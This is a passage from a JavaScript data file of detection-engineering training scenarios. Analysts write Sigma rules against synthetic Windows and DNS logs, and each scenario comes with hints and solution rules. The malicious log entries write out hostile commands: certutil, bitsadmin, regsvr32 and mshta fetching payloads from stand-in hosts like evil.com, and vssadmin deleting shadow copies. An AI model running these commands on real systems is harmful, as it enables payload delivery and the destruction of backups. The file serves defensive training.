/**
 * Level 1: Junior Analyst Scenarios (17 scenarios)
 * Focus: Basic pattern matching, single log source, clear indicators
 * Difficulty: 1-3 (Easy to Medium)
 */

export const LEVEL_1_SCENARIOS = [
  // Scenario 1: Encoded PowerShell
  {
    id: 'L1-001',
    title: 'The Hello World of Malware',
    level: 1,
    difficulty: 1,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Execution',
      tacticId: 'TA0002',
      technique: 'T1059.001',
      techniqueName: 'Command and Scripting Interpreter: PowerShell',
      url: 'https://attack.mitre.org/techniques/T1059/001/'
    },
    realWorldReference: {
      incidents: ['Emotet', 'Cobalt Strike', 'APT29'],
      description: 'Encoded PowerShell commands are commonly used by malware to obfuscate malicious payloads. The -EncodedCommand parameter accepts Base64-encoded scripts.',
      year: '2019-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-blue-500 pl-4">
          <h3 class="font-bold text-blue-400">Incident Report #001</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-yellow-400">MEDIUM</span></p>
        </div>
        <p><strong>Intelligence:</strong> We've detected suspicious PowerShell activity on several workstations. Attackers are using encoded commands to hide their true intentions.</p>
        <p><strong>Objective:</strong> Write a Sigma rule to detect PowerShell executions using the <code>-EncodedCommand</code> parameter or its abbreviations (<code>-enc</code>, <code>-e</code>).</p>
        <div class="bg-gray-800 p-3 rounded text-sm border border-gray-700">
          <strong class="text-yellow-400">Hint:</strong> Focus on the CommandLine field and look for encoding-related flags.
        </div>
      </div>
    `,
    logs: [
      {
        id: 1001,
        timestamp: 'Oct 27 08:00:01',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        processId: '4421',
        image: 'C:\\Windows\\System32\\svchost.exe',
        commandLine: 'svchost.exe -k netsvcs -p',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: false
      },
      {
        id: 1002,
        timestamp: 'Oct 27 08:05:22',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        processId: '5120',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 1003,
        timestamp: 'Oct 27 08:12:44',
        host: 'WORKSTATION-02',
        severity: 'WARN',
        processId: '1192',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAg',
        user: 'CORP\\jsmith',
        malicious: true
      },
      {
        id: 1004,
        timestamp: 'Oct 27 08:15:00',
        host: 'SERVER-DB',
        severity: 'INFO',
        processId: '8821',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Get-Service | Where-Object {$_.Status -eq "Running"}',
        user: 'CORP\\svc_monitor',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for the CommandLine field containing "-enc" or "-EncodedCommand"' },
      { cost: 100, content: 'Use the contains modifier: CommandLine|contains' },
      { cost: 200, content: 'detection:\\n  selection:\\n    CommandLine|contains:\\n      - \'-enc\'\\n      - \'-EncodedCommand\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [1003],
    starterCode: `# Detect encoded PowerShell execution
# Look for the encoding parameter in command lines

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 2: Whoami Reconnaissance
  {
    id: 'L1-002',
    title: 'Who Am I?',
    level: 1,
    difficulty: 1,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Discovery',
      tacticId: 'TA0007',
      technique: 'T1033',
      techniqueName: 'System Owner/User Discovery',
      url: 'https://attack.mitre.org/techniques/T1033/'
    },
    realWorldReference: {
      incidents: ['APT1', 'FIN7', 'Lazarus Group'],
      description: 'Whoami is one of the first commands attackers run after gaining access to understand their current context and privileges.',
      year: '2010-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #002</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Post-exploitation reconnaissance detected. Attackers are running <code>whoami</code> to discover their current user context.</p>
        <p><strong>Objective:</strong> Detect <code>whoami.exe</code> execution. Note: System accounts running whoami is highly suspicious.</p>
        <p><strong>Challenge:</strong> Admins use whoami too—focus on the SYSTEM account context.</p>
      </div>
    `,
    logs: [
      {
        id: 2001,
        timestamp: 'Oct 28 09:00:00',
        host: 'HR-PC-05',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\whoami.exe',
        commandLine: 'whoami /groups',
        user: 'CORP\\jdoe',
        malicious: false
      },
      {
        id: 2002,
        timestamp: 'Oct 28 09:05:00',
        host: 'WEB-SERVER-01',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\whoami.exe',
        commandLine: 'whoami',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 2003,
        timestamp: 'Oct 28 09:10:00',
        host: 'WEB-SERVER-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c echo heartbeat',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Filter on Image ending with whoami.exe AND User containing SYSTEM' },
      { cost: 100, content: 'Use multiple conditions: Image|endswith and User|contains' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'whoami.exe\'\\n    User|contains: \'SYSTEM\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [2002],
    starterCode: `# Detect suspicious whoami execution
# SYSTEM accounts rarely need to run whoami

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 3: Shadow Copy Deletion
  {
    id: 'L1-003',
    title: 'Shadow Destroyer',
    level: 1,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Impact',
      tacticId: 'TA0040',
      technique: 'T1490',
      techniqueName: 'Inhibit System Recovery',
      url: 'https://attack.mitre.org/techniques/T1490/'
    },
    realWorldReference: {
      incidents: ['Ryuk', 'REvil', 'Conti', 'WannaCry'],
      description: 'Ransomware actors delete Volume Shadow Copies to prevent file recovery. This is a critical pre-encryption step.',
      year: '2017-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-purple-500 pl-4">
          <h3 class="font-bold text-purple-400">Incident Report #003</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL - Ransomware Precursor</span></p>
        </div>
        <p><strong>Intelligence:</strong> Shadow copy deletion is a hallmark of ransomware attacks. Attackers use <code>vssadmin.exe</code> to remove backup copies before encrypting files.</p>
        <p><strong>Objective:</strong> Detect <code>vssadmin.exe</code> with "Delete Shadows" in the command line.</p>
      </div>
    `,
    logs: [
      {
        id: 3001,
        timestamp: 'Oct 29 10:00:00',
        host: 'FILE-SRV-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\vssadmin.exe',
        commandLine: 'vssadmin list shadows',
        user: 'CORP\\backup_svc',
        malicious: false
      },
      {
        id: 3002,
        timestamp: 'Oct 29 10:01:00',
        host: 'FILE-SRV-01',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\vssadmin.exe',
        commandLine: 'vssadmin Delete Shadows /All /Quiet',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 3003,
        timestamp: 'Oct 29 10:02:00',
        host: 'FILE-SRV-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\vssadmin.exe',
        commandLine: 'vssadmin list volumes',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "delete" and "shadows" in the CommandLine' },
      { cost: 100, content: 'You can use multiple contains conditions with |all modifier or just match both words' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'vssadmin.exe\'\\n    CommandLine|contains|all:\\n      - \'delete\'\\n      - \'shadows\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [3002],
    starterCode: `# Detect ransomware shadow copy deletion

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 4: Certutil Download
  {
    id: 'L1-004',
    title: 'Certificate of Malice',
    level: 1,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Command and Control',
      tacticId: 'TA0011',
      technique: 'T1105',
      techniqueName: 'Ingress Tool Transfer',
      url: 'https://attack.mitre.org/techniques/T1105/'
    },
    realWorldReference: {
      incidents: ['APT41', 'FIN7', 'Turla'],
      description: 'Certutil.exe is a legitimate Windows tool abused by attackers to download malicious payloads using the -urlcache flag.',
      year: '2017-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-orange-500 pl-4">
          <h3 class="font-bold text-orange-400">Incident Report #004</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-orange-400">MEDIUM</span></p>
        </div>
        <p><strong>Intelligence:</strong> Living-off-the-land attack detected. Attackers are abusing <code>certutil.exe</code> to download malicious files.</p>
        <p><strong>Objective:</strong> Detect certutil being used with <code>-urlcache</code> to download files.</p>
      </div>
    `,
    logs: [
      {
        id: 4001,
        timestamp: 'Oct 30 11:00:00',
        host: 'WORKSTATION-05',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\certutil.exe',
        commandLine: 'certutil -verify C:\\Certs\\server.crt',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 4002,
        timestamp: 'Oct 30 11:05:00',
        host: 'WORKSTATION-05',
        severity: 'WARN',
        image: 'C:\\Windows\\System32\\certutil.exe',
        commandLine: 'certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\update.exe',
        user: 'CORP\\jsmith',
        malicious: true
      },
      {
        id: 4003,
        timestamp: 'Oct 30 11:10:00',
        host: 'CA-SERVER',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\certutil.exe',
        commandLine: 'certutil -dump C:\\Certs\\root.cer',
        user: 'CORP\\ca_admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "-urlcache" in the command line' },
      { cost: 100, content: 'Combine Image filter with CommandLine contains' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'certutil.exe\'\\n    CommandLine|contains: \'-urlcache\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [4002],
    starterCode: `# Detect certutil abuse for file download

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 5: WMIC Process Creation
  {
    id: 'L1-005',
    title: 'WMI Weapon',
    level: 1,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Execution',
      tacticId: 'TA0002',
      technique: 'T1047',
      techniqueName: 'Windows Management Instrumentation',
      url: 'https://attack.mitre.org/techniques/T1047/'
    },
    realWorldReference: {
      incidents: ['APT29', 'Cobalt Strike', 'Lazarus'],
      description: 'WMIC is used by attackers for reconnaissance and to spawn processes, often bypassing application whitelisting.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-yellow-500 pl-4">
          <h3 class="font-bold text-yellow-400">Incident Report #005</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-yellow-400">MEDIUM</span></p>
        </div>
        <p><strong>Intelligence:</strong> WMIC is being used to spawn processes. This technique bypasses many security controls.</p>
        <p><strong>Objective:</strong> Detect WMIC being used with "process call create" to spawn new processes.</p>
      </div>
    `,
    logs: [
      {
        id: 5001,
        timestamp: 'Oct 31 09:00:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\wbem\\WMIC.exe',
        commandLine: 'wmic os get caption,version',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 5002,
        timestamp: 'Oct 31 09:05:00',
        host: 'WORKSTATION-08',
        severity: 'WARN',
        image: 'C:\\Windows\\System32\\wbem\\WMIC.exe',
        commandLine: 'wmic process call create "powershell.exe -ep bypass -file C:\\temp\\script.ps1"',
        user: 'CORP\\jdoe',
        malicious: true
      },
      {
        id: 5003,
        timestamp: 'Oct 31 09:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\wbem\\WMIC.exe',
        commandLine: 'wmic diskdrive get status',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "process call create" in the command line' },
      { cost: 100, content: 'Filter on WMIC.exe and CommandLine containing the process creation syntax' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'WMIC.exe\'\\n    CommandLine|contains: \'process call create\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [5002],
    starterCode: `# Detect WMIC process creation abuse

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 6: Mshta Execution
  {
    id: 'L1-006',
    title: 'HTML Application Attack',
    level: 1,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1218.005',
      techniqueName: 'Signed Binary Proxy Execution: Mshta',
      url: 'https://attack.mitre.org/techniques/T1218/005/'
    },
    realWorldReference: {
      incidents: ['Emotet', 'Qbot', 'Kovter'],
      description: 'Mshta.exe executes Microsoft HTML Applications (HTA) and can run inline VBScript/JavaScript, bypassing application controls.',
      year: '2016-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #006</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Mshta.exe is being weaponized to execute malicious scripts from URLs.</p>
        <p><strong>Objective:</strong> Detect mshta.exe executing content from HTTP/HTTPS URLs.</p>
      </div>
    `,
    logs: [
      {
        id: 6001,
        timestamp: 'Nov 01 10:00:00',
        host: 'WORKSTATION-03',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\mshta.exe',
        commandLine: 'mshta.exe "C:\\Program Files\\App\\help.hta"',
        user: 'CORP\\user1',
        malicious: false
      },
      {
        id: 6002,
        timestamp: 'Nov 01 10:05:00',
        host: 'WORKSTATION-07',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\mshta.exe',
        commandLine: 'mshta.exe http://malicious.site/payload.hta',
        user: 'CORP\\victim',
        malicious: true
      },
      {
        id: 6003,
        timestamp: 'Nov 01 10:10:00',
        host: 'DEV-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\mshta.exe',
        commandLine: 'mshta.exe about:blank',
        user: 'CORP\\developer',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "http" in the command line when mshta runs' },
      { cost: 100, content: 'Filter Image on mshta.exe and CommandLine contains http' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'mshta.exe\'\\n    CommandLine|contains: \'http\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [6002],
    starterCode: `# Detect mshta URL execution

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 7: Regsvr32 Abuse
  {
    id: 'L1-007',
    title: 'Squiblydoo Attack',
    level: 1,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1218.010',
      techniqueName: 'Signed Binary Proxy Execution: Regsvr32',
      url: 'https://attack.mitre.org/techniques/T1218/010/'
    },
    realWorldReference: {
      incidents: ['APT19', 'Cobalt Group', 'TA505'],
      description: 'Regsvr32 can execute COM scriptlets (.sct) from URLs using /s /n /u /i flags, known as Squiblydoo attack.',
      year: '2017-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-pink-500 pl-4">
          <h3 class="font-bold text-pink-400">Incident Report #007</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> The "Squiblydoo" technique uses regsvr32 with /i flag pointing to a URL containing a malicious scriptlet.</p>
        <p><strong>Objective:</strong> Detect regsvr32.exe with scrobj.dll and /i: pointing to external resources.</p>
      </div>
    `,
    logs: [
      {
        id: 7001,
        timestamp: 'Nov 02 14:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\regsvr32.exe',
        commandLine: 'regsvr32.exe /s C:\\Windows\\System32\\comctl32.ocx',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 7002,
        timestamp: 'Nov 02 14:05:00',
        host: 'WORKSTATION-09',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\regsvr32.exe',
        commandLine: 'regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll',
        user: 'CORP\\victim',
        malicious: true
      },
      {
        id: 7003,
        timestamp: 'Nov 02 14:10:00',
        host: 'DEV-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\regsvr32.exe',
        commandLine: 'regsvr32.exe /u msxml3.dll',
        user: 'CORP\\developer',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "scrobj.dll" in the command line' },
      { cost: 100, content: 'The malicious pattern includes both scrobj.dll and /i:' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'regsvr32.exe\'\\n    CommandLine|contains:\\n      - \'scrobj.dll\'\\n      - \'/i:\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [7002],
    starterCode: `# Detect Squiblydoo regsvr32 abuse

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 8: BITSAdmin Download
  {
    id: 'L1-008',
    title: 'Background Intelligence Transfer',
    level: 1,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1197',
      techniqueName: 'BITS Jobs',
      url: 'https://attack.mitre.org/techniques/T1197/'
    },
    realWorldReference: {
      incidents: ['APT40', 'Leviathan', 'UNC2452'],
      description: 'BITS (Background Intelligent Transfer Service) is abused by attackers for stealthy file downloads.',
      year: '2018-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-cyan-500 pl-4">
          <h3 class="font-bold text-cyan-400">Incident Report #008</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-yellow-400">MEDIUM</span></p>
        </div>
        <p><strong>Intelligence:</strong> Attackers are using BITSAdmin to download files in the background, evading network monitoring.</p>
        <p><strong>Objective:</strong> Detect bitsadmin.exe with /transfer flag being used to download files.</p>
      </div>
    `,
    logs: [
      {
        id: 8001,
        timestamp: 'Nov 03 08:00:00',
        host: 'UPDATE-SRV',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\bitsadmin.exe',
        commandLine: 'bitsadmin /list /allusers',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 8002,
        timestamp: 'Nov 03 08:10:00',
        host: 'WORKSTATION-12',
        severity: 'WARN',
        image: 'C:\\Windows\\System32\\bitsadmin.exe',
        commandLine: 'bitsadmin /transfer myJob /download /priority high http://evil.com/mal.exe C:\\temp\\legit.exe',
        user: 'CORP\\victim',
        malicious: true
      },
      {
        id: 8003,
        timestamp: 'Nov 03 08:15:00',
        host: 'UPDATE-SRV',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\bitsadmin.exe',
        commandLine: 'bitsadmin /info UpdateJob /verbose',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for /transfer flag in the command line' },
      { cost: 100, content: 'Filter on bitsadmin.exe with /transfer parameter' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'bitsadmin.exe\'\\n    CommandLine|contains: \'/transfer\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [8002],
    starterCode: `# Detect BITSAdmin file download

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 9: Scheduled Task Creation
  {
    id: 'L1-009',
    title: 'Scheduled Persistence',
    level: 1,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Persistence',
      tacticId: 'TA0003',
      technique: 'T1053.005',
      techniqueName: 'Scheduled Task/Job: Scheduled Task',
      url: 'https://attack.mitre.org/techniques/T1053/005/'
    },
    realWorldReference: {
      incidents: ['APT29', 'Lazarus', 'FIN7'],
      description: 'Attackers create scheduled tasks to maintain persistence and execute malicious payloads at specific times.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-green-500 pl-4">
          <h3 class="font-bold text-green-400">Incident Report #009</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-yellow-400">MEDIUM</span></p>
        </div>
        <p><strong>Intelligence:</strong> Scheduled tasks are being created for persistence. Monitor schtasks.exe with /create flag.</p>
        <p><strong>Objective:</strong> Detect schtasks.exe being used to create new scheduled tasks.</p>
      </div>
    `,
    logs: [
      {
        id: 9001,
        timestamp: 'Nov 04 09:00:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\schtasks.exe',
        commandLine: 'schtasks /query /fo LIST',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 9002,
        timestamp: 'Nov 04 09:15:00',
        host: 'WORKSTATION-15',
        severity: 'WARN',
        image: 'C:\\Windows\\System32\\schtasks.exe',
        commandLine: 'schtasks /create /tn "WindowsUpdate" /tr "C:\\temp\\malware.exe" /sc onlogon /ru SYSTEM',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 9003,
        timestamp: 'Nov 04 09:20:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\schtasks.exe',
        commandLine: 'schtasks /delete /tn "OldBackup" /f',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for /create flag in the command line' },
      { cost: 100, content: 'Filter on schtasks.exe with /create parameter' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'schtasks.exe\'\\n    CommandLine|contains: \'/create\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [9002],
    starterCode: `# Detect scheduled task creation for persistence

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 10: Service Installation
  {
    id: 'L1-010',
    title: 'Service Takeover',
    level: 1,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Persistence',
      tacticId: 'TA0003',
      technique: 'T1543.003',
      techniqueName: 'Create or Modify System Process: Windows Service',
      url: 'https://attack.mitre.org/techniques/T1543/003/'
    },
    realWorldReference: {
      incidents: ['APT28', 'Carbanak', 'TrickBot'],
      description: 'Attackers install malicious services using sc.exe to maintain persistence with SYSTEM privileges.',
      year: '2014-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #010</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> New Windows services are being installed. This is a common persistence technique.</p>
        <p><strong>Objective:</strong> Detect sc.exe being used with "create" to install new services.</p>
      </div>
    `,
    logs: [
      {
        id: 10001,
        timestamp: 'Nov 05 10:00:00',
        host: 'SERVER-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\sc.exe',
        commandLine: 'sc query type= service state= all',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 10002,
        timestamp: 'Nov 05 10:10:00',
        host: 'WORKSTATION-20',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\sc.exe',
        commandLine: 'sc create "WindowsUpdateSvc" binPath= "C:\\temp\\payload.exe" start= auto',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 10003,
        timestamp: 'Nov 05 10:15:00',
        host: 'SERVER-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\sc.exe',
        commandLine: 'sc config wuauserv start= auto',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "create" command in sc.exe execution' },
      { cost: 100, content: 'Filter sc.exe with CommandLine containing "create" and "binPath"' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'sc.exe\'\\n    CommandLine|contains:\\n      - \'create\'\\n      - \'binPath\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [10002],
    starterCode: `# Detect malicious service installation

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 11: Net User Enumeration
  {
    id: 'L1-011',
    title: 'User Hunter',
    level: 1,
    difficulty: 1,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Discovery',
      tacticId: 'TA0007',
      technique: 'T1087.001',
      techniqueName: 'Account Discovery: Local Account',
      url: 'https://attack.mitre.org/techniques/T1087/001/'
    },
    realWorldReference: {
      incidents: ['Most post-exploitation frameworks'],
      description: 'Net user command is commonly used by attackers to enumerate local and domain user accounts.',
      year: '2000-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-blue-500 pl-4">
          <h3 class="font-bold text-blue-400">Incident Report #011</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-yellow-400">MEDIUM</span></p>
        </div>
        <p><strong>Intelligence:</strong> User account enumeration detected. Attackers use net user commands to discover accounts.</p>
        <p><strong>Objective:</strong> Detect net.exe or net1.exe running with "user" and "/domain" parameters.</p>
      </div>
    `,
    logs: [
      {
        id: 11001,
        timestamp: 'Nov 06 11:00:00',
        host: 'HELPDESK-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\net.exe',
        commandLine: 'net use',
        user: 'CORP\\helpdesk',
        malicious: false
      },
      {
        id: 11002,
        timestamp: 'Nov 06 11:05:00',
        host: 'WORKSTATION-22',
        severity: 'WARN',
        image: 'C:\\Windows\\System32\\net.exe',
        commandLine: 'net user /domain',
        user: 'CORP\\attacker',
        malicious: true
      },
      {
        id: 11003,
        timestamp: 'Nov 06 11:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\net.exe',
        commandLine: 'net time \\\\dc01',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "user" and "/domain" in the command line' },
      { cost: 100, content: 'Filter on net.exe with user and /domain in CommandLine' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith:\\n      - \'net.exe\'\\n      - \'net1.exe\'\\n    CommandLine|contains|all:\\n      - \'user\'\\n      - \'/domain\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [11002],
    starterCode: `# Detect domain user enumeration

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 12: Suspicious DNS Query
  {
    id: 'L1-012',
    title: 'DNS Tunneling Scout',
    level: 1,
    difficulty: 3,
    logSource: 'dns',
    mitre: {
      tactic: 'Command and Control',
      tacticId: 'TA0011',
      technique: 'T1071.004',
      techniqueName: 'Application Layer Protocol: DNS',
      url: 'https://attack.mitre.org/techniques/T1071/004/'
    },
    realWorldReference: {
      incidents: ['APT34', 'DNSMessenger', 'SUNBURST'],
      description: 'Attackers use DNS queries to communicate with C2 infrastructure, often using long subdomains or TXT queries.',
      year: '2017-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-purple-500 pl-4">
          <h3 class="font-bold text-purple-400">Incident Report #012</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Suspicious DNS queries detected. Possible DNS tunneling or C2 communication.</p>
        <p><strong>Objective:</strong> Detect DNS queries for TXT records to suspicious domains.</p>
      </div>
    `,
    logs: [
      {
        id: 12001,
        timestamp: 'Nov 07 12:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        logSource: 'dns',
        processName: 'chrome.exe',
        queryName: 'www.google.com',
        queryType: 'A',
        responseCode: 'NOERROR',
        malicious: false
      },
      {
        id: 12002,
        timestamp: 'Nov 07 12:05:00',
        host: 'WORKSTATION-05',
        severity: 'WARN',
        logSource: 'dns',
        processName: 'powershell.exe',
        queryName: 'aGVsbG8gd29ybGQ.evil-c2.com',
        queryType: 'TXT',
        responseCode: 'NOERROR',
        malicious: true
      },
      {
        id: 12003,
        timestamp: 'Nov 07 12:10:00',
        host: 'MAIL-SRV',
        severity: 'INFO',
        logSource: 'dns',
        processName: 'msexchangetransport.exe',
        queryName: 'contoso.com',
        queryType: 'MX',
        responseCode: 'NOERROR',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for TXT query types from PowerShell' },
      { cost: 100, content: 'Filter on QueryType TXT and ProcessName powershell' },
      { cost: 200, content: 'detection:\\n  selection:\\n    QueryType: \'TXT\'\\n    ProcessName|endswith: \'powershell.exe\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [12002],
    starterCode: `# Detect suspicious DNS TXT queries

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 13: Failed Login Brute Force
  {
    id: 'L1-013',
    title: 'Brute Force Detected',
    level: 1,
    difficulty: 2,
    logSource: 'authentication',
    mitre: {
      tactic: 'Credential Access',
      tacticId: 'TA0006',
      technique: 'T1110.001',
      techniqueName: 'Brute Force: Password Guessing',
      url: 'https://attack.mitre.org/techniques/T1110/001/'
    },
    realWorldReference: {
      incidents: ['Common attack vector', 'APT33', 'Lazarus'],
      description: 'Attackers attempt multiple passwords against accounts to gain access. Failed logins from external IPs are suspicious.',
      year: '1990-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
